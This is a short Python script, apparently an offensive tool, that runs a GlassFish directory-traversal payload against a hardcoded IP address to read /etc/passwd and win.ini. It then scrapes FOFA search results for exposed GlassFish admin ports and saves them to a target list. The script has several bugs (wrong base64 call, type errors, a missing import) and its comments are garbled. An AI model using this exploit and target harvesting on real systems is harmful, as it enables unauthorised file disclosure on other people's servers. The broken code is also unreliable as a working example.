import os
import time

import requests
import nmap
import base64
import lxml

import sys

def check_vunl_fofa(s, line):

    url = 'http://186.201.33.126:8080'
    payload_linux = '/theme/META-INF/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd'
    paload_win = '/theme/META-INF/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/windows/win.ini'
    data_linux = requests.get(url+payload_linux)
    data_win = requests.get(url+paload_win)

    stauts_linux = requests.get(url+payload_linux).status_code #��ȡ���ص�״̬��
    stauts_win = requests.get(url+paload_win).status_code


    print("Linux system test:"+data_linux.content.decode('utf-8')+'|'+data_linux.status_code)

    print("Windows system test:"+data_win.content.decode('utf-8')+'|'+data_win.status_code)

    if data_win==200 :
        print("Windows")
    if data_linux==200:
        print("Linux")

    '''
    ���ʵ��������֤
    1. ��ȡ������©����Ϣ�ĵ�ַ������Fofa zoomeye�������շѵ�רҵ��Աʹ�ã�
        1.1 �����󵽵������ٽ���ɸѡ re��bs4��xml�ȵȷ���
    2. ���������ַ��Ϣ�����ж�
    '''

    'https://fofa.so/result?qbase64=<base63 encoding>'

    search = '"glassfish" && port ="4848"'
    # ��ҳ����
    # url_fofa = 'https://fofa.so/result?qbase64='
    # ��ҳ����
    # url_fofa = 'https://fofa.so/result?page='+ str(pages) + "&qbase64="
    login_header ={
        'user-agent' : 'chorme 100.0.0',
        'cookie' : '_fofapro_ars_session=_xxxxxxxxxxxxxxxxxxxxxxxxxxx;result_per_page=20',
        'referer' : 'https://fofa.so/'
    }


    for pages in range(1,10):
        try:
            url_fofa = 'https://fofa.so/result?page=' + str(pages) + "&qbase64="
            search_b64 = str(base64.b64decode(search.encode('utf-8')),"utf-8")
            data_search = url_fofa + search_b64
            # print(data_search)
            print("extract page:" + pages +" ing\n")
            fofa_search = requests.get(data_search,headers=login_header,timeout=0.8).content
            print(fofa_search.decode('utf-8'))

            soup = etree.HTML(fofa_search)
            ip_target_list = soup.xpath('//div[@class="re_domain"]/a[@target="_blank"]/@href')

            target_list='\n'.join(ip_target_list)

            with open(r'ip_target_liat.txt','a+') as f:
                f.write(target_list+'\n')
                f.close()
                time.sleep(1)
        except Exception as e:
            pass




if __name__ == '__main__':
    searchvar = sys.argv[1]
    linevar = sys.argv[2]
    check_vunl_fofa(searchvar,int(linevar))
